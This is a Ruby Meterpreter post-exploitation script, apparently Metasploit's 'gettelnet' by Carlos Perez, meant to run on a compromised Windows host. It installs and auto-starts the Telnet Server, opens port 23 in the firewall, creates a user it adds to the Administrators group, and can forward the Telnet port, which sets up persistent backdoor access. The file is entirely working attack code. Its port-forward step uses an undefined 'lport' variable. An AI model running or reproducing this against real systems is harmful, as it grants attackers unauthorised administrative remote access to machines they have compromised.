# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
@client = client
host_name = client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory,'scripts', 'gettelnet')

# Create the log directory
::FileUtils.mkdir_p(logs)

# Cleaup script file name
@dest = logs + "/clean_up_" + filenameinfo + ".rc"

@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-e" => [ false, "Enable Telnet Server only."  ],
	"-p" => [ true,  "The Password of the user to add."  ],
	"-u" => [ true,  "The Username of the user to add."  ],
	"-f" => [ true,  "Forward Telnet Connection." ]
)
def checkifinst()
	# This won't work on windows 2000 since there is no sc.exe
	print_status("Checking if Telnet is installed...")
	begin
		registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\","Start")
		return true
	rescue
		return false

	end
end

#---------------------------------------------------------------------------------------------------------
def insttlntsrv()
	trgtos = @client.sys.config.sysinfo['OS']
	if trgtos =~ /Vista|7|2008/
		print_status("Checking if Telnet Service is Installed")
		if checkifinst()
			print_status("Telnet Service Installed on Target")
		else
			print_status("Installing Telnet Server Service ......")
			cmd_exec("cmd /c ocsetup TelnetServer")
			prog2check = "ocsetup.exe"
			found = 0
			while found == 0
				@client.sys.process.get_processes().each do |x|
					found =1
					if prog2check == (x['name'].downcase)
						print_line "*"
						sleep(0.5)
						found = 0
					end
				end
			end
			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
			print_status("Finished installing the Telnet Service.")

		end
	elsif trgtos =~ /2003/
		file_local_write(@dest,"reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
	end
end
#---------------------------------------------------------------------------------------------------------
def enabletlntsrv()
	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\"
	value2 = "Start"
	begin
		v2 = registry_getvaldata(key2,value2)
		print_status "Setting Telnet Server Services service startup mode"
		if v2 != 2
			print_status "\tThe Telnet Server Services service is not set to auto, changing it to auto ..."
			cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr", ]
			cmmds. each do |cmd|
				cmd_exec(cmd)
			end
		else
			print_status "\tTelnet Server Services service is already set to auto"
		end
		# Enabling Exception on the Firewall
		print_status "\tOpening port in local firewall if necessary"
		cmd_exec('netsh firewall set portopening protocol = tcp port = 23 mode = enable')

	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end

end
#---------------------------------------------------------------------------------------------------------
def addrdpusr(username, password)
	print_status "Setting user account for logon"
	print_status "\tAdding User: #{username} with Password: #{password}"
	begin
		cmd_exec("net user #{username} #{password} /add")
		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
		print_status "\tAdding User: #{username} to local group TelnetClients"
		cmd_exec("net localgroup \"TelnetClients\" #{username} /add")

		print_status "\tAdding User: #{username} to local group Administrators"
		cmd_exec("net localgroup Administrators #{username} /add")

		print_status "You can now login with the created user"
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
end
#---------------------------------------------------------------------------------------------------------
def message
	print_status "Windows Telnet Server Enabler Meterpreter Script"
end
def usage
	print_line("Windows Telnet Server Enabler Meterpreter Script")
	print_line("Usage: gettelnet -u <username> -p <password>")
	print_line(@@exec_opts.usage)
	raise Rex::Script::Completed
end


#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end


################## MAIN ##################
# Parsing of Options
usr = nil
pass = nil
frwrd = nil
enbl = nil
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-u"
		usr = val
	when "-p"
		pass = val
	when "-h"
		usage
	when "-f"
		frwrd = true
	when "-e"
		enbl = true
	end

}

unsupported if client.platform !~ /win32|win64/i

if enbl
	message
	insttlntsrv()
	enabletlntsrv()
	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")

elsif usr!= nil && pass != nil
	message
	insttlntsrv()
	enabletlntsrv()
	addrdpusr(usr, pass)
	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")

else
	usage
end
if frwrd == true
	print_status("Starting the port forwarding at local port #{lport}")
	client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 23 -r 127.0.0.1")
end
